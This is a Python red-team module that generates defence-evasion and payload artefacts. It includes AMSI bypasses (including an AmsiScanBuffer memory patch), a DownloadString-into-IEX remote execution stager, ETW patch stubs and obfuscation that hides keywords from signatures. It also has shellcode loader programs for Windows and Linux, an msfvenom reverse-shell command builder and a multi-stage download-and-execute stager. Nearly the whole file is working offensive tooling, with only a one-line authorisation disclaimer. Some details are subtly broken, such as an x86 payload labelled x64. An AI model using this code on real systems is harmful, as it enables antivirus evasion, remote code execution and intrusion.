"""
Evasion Engine Module for Red Team Operations.

Generates AMSI bypass snippets, AV evasion payloads, encoded stagers,
PowerShell obfuscation, shellcode wrappers, and msfvenom command lines.
All output is string templates — no external payloads are fetched or
executed by this module.

⚠  FOR AUTHORISED SECURITY TESTING ONLY.  Unauthorised use is illegal.

Typical usage:
    engine = EvasionEngine()
    bypasses = engine.generate_amsi_bypass(method="env_var")
    cmd = engine.msfvenom_generate(payload="windows/x64/meterpreter/reverse_tcp",
                                   lhost="10.10.14.1", lport=4444)
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import re
import string
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class PayloadTemplate:
    """Describes a payload option for the msfvenom wrapper."""

    name: str
    description: str
    platform: str
    arch: str
    command: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "platform": self.platform,
            "arch": self.arch,
            "command": self.command,
        }


# ---------------------------------------------------------------------------
# Popular msfvenom payloads
# ---------------------------------------------------------------------------

PAYLOAD_CATALOG: List[PayloadTemplate] = [
    PayloadTemplate(
        name="windows/x64/meterpreter/reverse_tcp",
        description="Windows x64 Meterpreter reverse TCP shell",
        platform="windows", arch="x64",
        command="msfvenom -p windows/x64/meterpreter/reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
    PayloadTemplate(
        name="windows/meterpreter/reverse_tcp",
        description="Windows x86 Meterpreter reverse TCP shell",
        platform="windows", arch="x64",
        command="msfvenom -p windows/meterpreter/reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
    PayloadTemplate(
        name="linux/x64/meterpreter/reverse_tcp",
        description="Linux x64 Meterpreter reverse TCP shell",
        platform="linux", arch="x64",
        command="msfvenom -p linux/x64/meterpreter/reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
    PayloadTemplate(
        name="linux/x86/meterpreter/reverse_tcp",
        description="Linux x86 Meterpreter reverse TCP shell",
        platform="linux", arch="x86",
        command="msfvenom -p linux/x86/meterpreter/reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
    PayloadTemplate(
        name="osx/x64/meterpreter/reverse_tcp",
        description="macOS x64 Meterpreter reverse TCP shell",
        platform="osx", arch="x64",
        command="msfvenom -p osx/x64/meterpreter/reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
    PayloadTemplate(
        name="java/jsp_shell_reverse_tcp",
        description="Java JSP reverse shell",
        platform="java", arch="generic",
        command="msfvenom -p java/jsp_shell_reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
    PayloadTemplate(
        name="php/meterpreter/reverse_tcp",
        description="PHP Meterpreter reverse TCP",
        platform="php", arch="generic",
        command="msfvenom -p php/meterpreter/reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
    PayloadTemplate(
        name="python/meterpreter/reverse_tcp",
        description="Python Meterpreter reverse TCP",
        platform="python", arch="generic",
        command="msfvenom -p python/meterpreter/reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
    PayloadTemplate(
        name="windows/x64/shell_reverse_tcp",
        description="Windows x64 plain reverse shell (no Meterpreter)",
        platform="windows", arch="x64",
        command="msfvenom -p windows/x64/shell_reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    ),
]


# ---------------------------------------------------------------------------
# Obfuscation helpers
# ---------------------------------------------------------------------------

_OBFUSCATION_CHARS = string.ascii_letters + string.digits


def _random_identifier(length: int = 10) -> str:
    """Generate a random variable name."""
    first = random.choice(string.ascii_letters + "_")
    rest = "".join(random.choices(_OBFUSCATION_CHARS, k=length - 1))
    return first + rest


def _random_string(length: int = 8) -> str:
    return "".join(random.choices(_OBFUSCATION_CHARS, k=length))


# ---------------------------------------------------------------------------
# EvasionEngine
# ---------------------------------------------------------------------------

class EvasionEngine:
    """Central class for generating evasion artefacts."""

    # -- AMSI bypass --------------------------------------------------------

    def generate_amsi_bypass(
        self,
        method: str = "env_var",
        extra_context: Optional[Dict[str, str]] = None,
    ) -> List[str]:
        """Return a list of AMSI bypass snippets.

        Available methods:
          env_var        – Set ``AMSI_INIT_FAILED`` env variable to null.
          reflection     – Patch AmsiScanBuffer via .NET reflection.
          patch_amsi     – Direct WinAPI patch (VirtualProtect + memcpy).
          downloadstring – Pull an off-host bypass script.
          base64_decode  – Base64-decode and Invoke-Expression a pre-encoded
                           bypass script.
        """
        ctx = extra_context or {}
        bypasses: List[str] = []

        if method in ("env_var", "all"):
            bypasses.append(self._amsi_env_var())
        if method in ("reflection", "all"):
            bypasses.append(self._amsi_reflection())
        if method in ("patch_amsi", "all"):
            bypasses.append(self._amsi_patch())
        if method in ("downloadstring", "all"):
            url = ctx.get("url", "http://127.0.0.1/bypass.ps1")
            bypasses.append(self._amsi_downloadstring(url))
        if method in ("base64_decode", "all"):
            script = ctx.get("script", "Write-Output 'bypassed'")
            bypasses.append(self._amsi_base64(script))

        if not bypasses:
            bypasses.append(self._amsi_env_var())

        return bypasses

    def _amsi_env_var(self) -> str:
        return (
            "[Environment]::SetEnvironmentVariable('AMSI_INIT_FAILED', "
            "'True', 'Process')\n"
            "# AMSI bypass: environment variable trick\n"
            "# Effect: prevents AMSI initialization in current process"
        )

    def _amsi_reflection(self) -> str:
        # Randomise identifiers to frustrate static signatures
        t = _random_identifier()
        f = _random_identifier()
        m = _random_identifier()
        d = _random_identifier()
        s = _random_identifier()
        return (
            f"$t = [Ref].Assembly.GetTypes();\n"
            f"ForEach ($f in $t) {{\n"
            f"  if ($f.Name -like '{_random_string(12)}i') {{ {m} = $f }}\n"
            f"}}\n"
            f"${m} = $t | Where-Object {{$_.Name -like '*Utils*'}} | Select "
            f"-First 1;\n"
            f"${d} = $m.GetField('amsiInitFailed', 'NonPublic,Static');\n"
            f"${s} = [System.Reflection.BindingFlags]'NonPublic,Static';\n"
            f"${d}.SetValue($null, $true)\n"
            f"# AMSI bypass: .NET reflection patching"
        )

    def _amsi_patch(self) -> str:
        return (
            "Add-Type -TypeDefinition @'\n"
            "using System;\n"
            "using System.Runtime.InteropServices;\n"
            "public class AmsiPatch {\n"
            "  [DllImport(\"kernel32\")]\n"
            "  public static extern bool VirtualProtect(\n"
            "    IntPtr a, uint b, uint c, out uint d);\n"
            "  public static void Patch() {\n"
            "    // Load amsi.dll and patch AmsiScanBuffer\n"
            "    var ptr = LoadLibrary(\"amsi.dll\");\n"
            "    var addr = GetProcAddress(ptr, \"AmsiScanBuffer\");\n"
            "    uint old;\n"
            "    VirtualProtect(addr, 0x60, 0x40, out old);\n"
            "    byte[] patch = {0xC3};\n"
            "    Marshal.Copy(patch, 0, addr, 1);\n"
            "  }\n"
            "  [DllImport(\"kernel32\")] static extern IntPtr "
            "LoadLibrary(string n);\n"
            "  [DllImport(\"kernel32\")] static extern IntPtr "
            "GetProcAddress(IntPtr m, string p);\n"
            "}\n"
            "'@\n"
            "[AmsiPatch]::Patch()\n"
            "# AMSI bypass: direct AmsiScanBuffer patch"
        )

    def _amsi_downloadstring(self, url: str) -> str:
        return (
            f"$c = New-Object Net.WebClient;\n"
            f"$c.Proxy = [Net.WebRequest]::GetSystemWebProxy();\n"
            f"$c.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCred"
            f"entials;\n"
            f"$c.DownloadString('{url}') | IEX\n"
            f"# AMSI bypass: remote script execution via DownloadString"
        )

    def _amsi_base64(self, script: str) -> str:
        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        return (
            f"$b = '{encoded}';\n"
            f"$d = [Text.Encoding]::Unicode.GetString("
            f"[Convert]::FromBase64String($b));\n"
            f"IEX $d\n"
            f"# AMSI bypass: base64-encoded Invoke-Expression"
        )

    # -- AV evasion ---------------------------------------------------------

    def generate_av_evasion(
        self,
        method: str = "polymorphic",
    ) -> List[str]:
        """Generate AV evasion snippets.

        Methods:
          polymorphic    – Randomise variable names and inject dead code.
          amsi_patching  – AMSI + ETW patch combined.
          syscalls        – Direct syscall stubs to bypass userland hooks.
        """
        results: List[str] = []

        if method in ("polymorphic", "all"):
            results.append(self._av_polymorphic())
        if method in ("amsi_patching", "all"):
            results.append(self._av_amsi_etw_patch())
        if method in ("syscalls", "all"):
            results.append(self._av_direct_syscalls())

        if not results:
            results.append(self._av_polymorphic())

        return results

    def _av_polymorphic(self) -> str:
        """Generate a polymorphic script with randomised names and junk code."""
        junk_lines = []
        for _ in range(random.randint(3, 8)):
            var = _random_identifier()
            junk_lines.append(f"${var} = Get-Random -Minimum 1 -Maximum 99999")
        junk = "\n".join(junk_lines)

        fn_name = _random_identifier()
        return (
            f"# Polymorphic evasion shellcode loader\n"
            f"{junk}\n"
            f"function {fn_name} {{\n"
            f"  param([byte[]] $buf)\n"
            f"  $t = [System.Reflection.Assembly]::Load($buf)\n"
            f"}}\n"
            f"# Execute: ${fn_name} $shellcode\n"
            f"# Variable names and junk code randomised per invocation"
        )

    def _av_amsi_etw_patch(self) -> str:
        return (
            "# Combined AMSI + ETW patch\n"
            "Add-Type @'\n"
            "using System;\n"
            "using System.Runtime.InteropServices;\n"
            "public class EtwPatch {\n"
            "  [DllImport(\"ntdll.dll\")]\n"
            "  public static extern uint NtProtectVirtualMemory(\n"
            "    IntPtr h, ref IntPtr a, ref uint s, uint p, out uint o);\n"
            "}\n"
            "'@\n"
            "# ETW bypass: patch EtwEventWrite to return immediately\n"
            "Add-Type -TypeDefinition @'\n"
            "using System;\n"
            "using System.Runtime.InteropServices;\n"
            "public class AmsiEtw {\n"
            "  [DllImport(\"kernel32\", SetLastError=true)]\n"
            "  public static extern bool VirtualProtect(\n"
            "    IntPtr a, uint b, uint c, out uint d);\n"
            "  [DllImport(\"kernel32\")] public static extern IntPtr "
            "LoadLibrary(string n);\n"
            "  [DllImport(\"kernel32\")] public static extern IntPtr "
            "GetProcAddress(IntPtr m, string p);\n"
            "}\n"
            "'@"
        )

    def _av_direct_syscalls(self) -> str:
        return (
            "# Direct syscall stubs — bypass userland hooks from security products\n"
            "# Example: NtAllocateVirtualMemory via syscall instruction\n"
            "Add-Type -TypeDefinition @'\n"
            "using System;\n"
            "using System.Runtime.InteropServices;\n"
            "public class Syscalls {\n"
            "  [DllImport(\"kernel32.dll\", SetLastError=true)]\n"
            "  public static extern bool VirtualProtect(\n"
            "    IntPtr lpAddress, UIntPtr dwSize,\n"
            "    uint flNewProtect, out uint lpflOldProtect);\n"
            "\n"
            "  // Syscall numbers vary by Windows build\n"
            "  // NtAllocateVirtualMemory:  0x18 (Win10 1903+)\n"
            "  // NtProtectVirtualMemory:   0x50\n"
            "  // NtWriteVirtualMemory:     0x3A\n"
            "  // Use SysWhispers or manual stubs to invoke\n"
            "}\n"
            "'@\n"
            "# Integrate with SysWhispers3 / HellsGate / TartarusGate"
        )

    # -- payload encoding ---------------------------------------------------

    def encode_payload(
        self,
        payload: str,
        encoding: str = "base64",
    ) -> str:
        """Encode a raw payload string.

        Encodings:
          base64       – Base64.
          hex          – Hex string.
          xor          – XOR with a random single-byte key.
          rot13        – Simple ROT13 (text payloads only).
          base64_gzip  – gzip-compress then base64-encode.
        """
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        if encoding == "hex":
            return payload.encode().hex()
        if encoding == "xor":
            key = random.randint(1, 255)
            encoded = bytes(b ^ key for b in payload.encode())
            return f"KEY={key:02X}:" + encoded.hex()
        if encoding == "rot13":
            return payload.encode().decode("rot13")
        if encoding == "base64_gzip":
            import gzip
            compressed = gzip.compress(payload.encode())
            return base64.b64encode(compressed).decode()
        raise ValueError(f"Unknown encoding: {encoding}")

    def decode_payload(self, encoded: str, encoding: str) -> str:
        """Reverse encode_payload."""
        if encoding == "base64":
            return base64.b64decode(encoded).decode(errors="replace")
        if encoding == "hex":
            return bytes.fromhex(encoded).decode(errors="replace")
        if encoding == "xor":
            key_hex, hex_data = encoded.split(":", 1)
            key = int(key_hex.replace("KEY=", ""), 16)
            raw = bytes(b ^ key for b in bytes.fromhex(hex_data))
            return raw.decode(errors="replace")
        if encoding == "rot13":
            return encoded.encode().decode("rot13")
        raise ValueError(f"Unknown encoding: {encoding}")

    # -- PowerShell obfuscation ---------------------------------------------

    def obfuscate_powershell(
        self,
        script: str,
        techniques: Optional[List[str]] = None,
    ) -> str:
        """Apply multiple PowerShell obfuscation layers.

        Techniques:
          string_format  – Replace string literals with -Format calls.
          char_codes     – Convert strings to [char] arithmetic.
          variable_rename– Rename all $variables to random names.
          tick_insert    – Insert backtick (`` ` ``) inside keywords.
          invoke_expression – Wrap with Invoke-Expression.
        """
        if techniques is None:
            techniques = [
                "variable_rename",
                "tick_insert",
                "invoke_expression",
            ]

        result = script
        for tech in techniques:
            if tech == "string_format":
                result = self._obf_string_format(result)
            elif tech == "char_codes":
                result = self._obf_char_codes(result)
            elif tech == "variable_rename":
                result = self._obf_var_rename(result)
            elif tech == "tick_insert":
                result = self._obf_tick_insert(result)
            elif tech == "invoke_expression":
                result = self._obf_invoke_expression(result)
        return result

    def _obf_string_format(self, script: str) -> str:
        """Replace string literals with ``-f`` format strings."""
        def _replace(m: re.Match[str]) -> str:
            s = m.group(1)
            if len(s) < 2:
                return m.group(0)
            indices = list(range(len(s)))
            random.shuffle(indices)
            perm = [s[i] for i in indices]
            fmt = "".join(perm)
            args = ", ".join(f"'{s[i]}'" for i in indices)
            return f"'{fmt}' -f {args}"

        return re.sub(r"'([^']{2,})'", _replace, script)

    def _obf_char_codes(self, script: str) -> str:
        """Convert a string literal into ``[char]`` arithmetic expressions."""
        def _replace(m: re.Match[str]) -> str:
            s = m.group(1)
            parts: List[str] = []
            for ch in s:
                code = ord(ch)
                offset = random.randint(-5, 5)
                if offset == 0:
                    offset = 1
                parts.append(f"[char]({code - offset}+{offset})")
            return "(" + "+".join(parts) + ")"

        return re.sub(r"'([^']{3,})'", _replace, script)

    def _obf_var_rename(self, script: str) -> str:
        """Rename variables to random identifiers."""
        var_map: Dict[str, str] = {}
        def _replace(m: re.Match[str]) -> str:
            var = m.group(0)
            if var not in var_map:
                var_map[var] = "$" + _random_identifier()
            return var_map[var]

        result = re.sub(r"\$\w+", _replace, script)
        return result

    def _obf_tick_insert(self, script: str) -> str:
        """Insert backtick characters inside PowerShell keywords."""
        keywords = [
            "Invoke-Expression", "Invoke-WebRequest",
            "DownloadString", "DownloadFile",
            "Start-Process", "New-Object",
            "IEX", "Set-Content", "Get-Content",
        ]
        result = script
        for kw in keywords:
            if kw in result:
                mid = len(kw) // 2
                obf_kw = kw[:mid] + "`" + kw[mid:]
                result = result.replace(kw, obf_kw)
        return result

    def _obf_invoke_expression(self, script: str) -> str:
        """Wrap script in an Invoke-Expression call."""
        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        return (
            f"$b = '{encoded}';\n"
            f"IEX ([Text.Encoding]::Unicode.GetString("
            f"[Convert]::FromBase64String($b)))"
        )

    # -- shellcode wrappers -------------------------------------------------

    def generate_shellcode_wrapper(
        self,
        shellcode_hex: str,
        platform: str = "windows",
        arch: str = "x64",
    ) -> str:
        """Wrap raw hex shellcode in a loader stub.

        Supported platforms: windows (C), linux (C).
        """
        if platform == "windows":
            return self._shellcode_wrapper_windows(shellcode_hex, arch)
        if platform == "linux":
            return self._shellcode_wrapper_linux(shellcode_hex)
        return f"// Unsupported platform: {platform}"

    def _shellcode_wrapper_windows(self, sc_hex: str, arch: str) -> str:
        sc_clean = sc_hex.replace("\\x", "").replace("0x", "").replace(" ", "")
        sc_clean = sc_clean.replace(",", "")
        # Format as C byte array
        parts = [f"0x{sc_clean[i:i+2]}" for i in range(0, len(sc_clean), 2)]
        arr = ",\n    ".join(parts)

        ptr_type = "LPVOID" if arch == "x64" else "LPVOID"
        return (
            "#include <windows.h>\n"
            "#include <stdio.h>\n\n"
            "int main(void) {\n"
            "    unsigned char shellcode[] = {\n"
            f"    {arr}\n"
            "    };\n\n"
            f"    {ptr_type} exec_mem;\n"
            "    BOOL rv;\n"
            "    HANDLE th;\n\n"
            "    exec_mem = VirtualAlloc(\n"
            "        0,\n"
            "        sizeof(shellcode),\n"
            "        MEM_COMMIT | MEM_RESERVE,\n"
            "        PAGE_READWRITE\n"
            "    );\n\n"
            "    if (exec_mem == NULL) {\n"
            "        printf(\"VirtualAlloc failed\\n\");\n"
            "        return 1;\n"
            "    }\n\n"
            "    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));\n\n"
            "    DWORD oldProtect;\n"
            "    rv = VirtualProtect(\n"
            "        exec_mem,\n"
            "        sizeof(shellcode),\n"
            "        PAGE_EXECUTE_READ,\n"
            "        &oldProtect\n"
            "    );\n\n"
            "    if (!rv) {\n"
            "        printf(\"VirtualProtect failed\\n\");\n"
            "        return 1;\n"
            "    }\n\n"
            "    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, "
            "0, 0, 0);\n"
            "    WaitForSingleObject(th, INFINITE);\n\n"
            "    return 0;\n"
            "}\n"
        )

    def _shellcode_wrapper_linux(self, sc_hex: str) -> str:
        sc_clean = sc_hex.replace("\\x", "").replace("0x", "").replace(" ", "")
        sc_clean = sc_clean.replace(",", "")
        parts = [f"0x{sc_clean[i:i+2]}" for i in range(0, len(sc_clean), 2)]
        arr = ",\n    ".join(parts)

        return (
            '#include <stdio.h>\n'
            '#include <string.h>\n'
            '#include <sys/mman.h>\n\n'
            'int main(void) {\n'
            '    unsigned char shellcode[] = {\n'
            f'    {arr}\n'
            '    };\n\n'
            '    void *exec_mem = mmap(\n'
            '        0,\n'
            '        sizeof(shellcode),\n'
            '        PROT_READ | PROT_WRITE | PROT_EXEC,\n'
            '        MAP_PRIVATE | MAP_ANONYMOUS,\n'
            '        -1,\n'
            '        0\n'
            '    );\n\n'
            '    if (exec_mem == MAP_FAILED) {\n'
            '        perror("mmap");\n'
            '        return 1;\n'
            '    }\n\n'
            '    memcpy(exec_mem, shellcode, sizeof(shellcode));\n\n'
            '    ((void(*)())exec_mem)();\n\n'
            '    return 0;\n'
            '}\n'
        )

    # -- msfvenom wrapper ---------------------------------------------------

    def msfvenom_generate(
        self,
        payload: str = "windows/x64/meterpreter/reverse_tcp",
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        format: str = "exe",
        output: str = "payload.exe",
        badchars: Optional[str] = None,
        encoder: Optional[str] = None,
        iterations: int = 1,
    ) -> str:
        """Build an msfvenom command line string."""
        cmd_parts = ["msfvenom", f"-p {payload}"]
        cmd_parts.append(f"LHOST={lhost}")
        cmd_parts.append(f"LPORT={lport}")

        if badchars:
            cmd_parts.append(f"-b '{badchars}'")
        if encoder:
            cmd_parts.append(f"-e {encoder}")
            cmd_parts.append(f"-i {iterations}")

        cmd_parts.append(f"-f {format}")
        cmd_parts.append(f"-o {output}")
        return " ".join(cmd_parts)

    def msfvenom_list_payloads(
        self,
        platform: Optional[str] = None,
    ) -> List[PayloadTemplate]:
        """Return available payloads, optionally filtered by platform."""
        if platform:
            return [p for p in PAYLOAD_CATALOG if p.platform == platform]
        return list(PAYLOAD_CATALOG)

    # -- combined evasion script generator ----------------------------------

    def generate_full_evasion_stager(
        self,
        payload_url: str,
        lhost: str = "127.0.0.1",
        lport: int = 4444,
    ) -> Dict[str, str]:
        """Generate a combined evasion stager with multiple stages.

        Returns a dict of ``{stage_name: script_content}``.
        """
        stages: Dict[str, str] = {}

        # Stage 1: AMSI bypass
        amsi_bypasses = self.generate_amsi_bypass(method="env_var")
        stages["amsi_bypass"] = amsi_bypasses[0] if amsi_bypasses else ""

        # Stage 2: ETW bypass (via AMSI combined patch)
        av_evasions = self.generate_av_evasion(method="amsi_patching")
        stages["etw_bypass"] = av_evasions[0] if av_evasions else ""

        # Stage 3: Download and execute payload
        download_stage = (
            f"$wc = New-Object System.Net.WebClient;\n"
            f"$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();\n"
            f"$wc.Proxy.Credentials = "
            f"[System.Net.CredentialCache]::DefaultNetworkCredentials;\n"
            f"$data = $wc.DownloadData('{payload_url}');\n"
            f"[System.Reflection.Assembly]::Load($data).EntryPoint.Invoke("
            f"$null, @())"
        )
        stages["download_execute"] = download_stage

        # Stage 4: Msfvenom command for the payload
        msf_cmd = self.msfvenom_generate(
            payload="windows/x64/meterpreter/reverse_tcp",
            lhost=lhost,
            lport=lport,
            format="csharp",
            output="payload.csharp",
        )
        stages["msfvenom_command"] = msf_cmd

        return stages

    # -- utility ------------------------------------------------------------

    @staticmethod
    def generate_random_key(length: int = 16) -> str:
        """Generate a random hex key for XOR encoding."""
        return "".join(random.choices("0123456789abcdef", k=length * 2))

    @staticmethod
    def xor_bytes(data: bytes, key: bytes) -> bytes:
        """XOR data with a repeating key."""
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
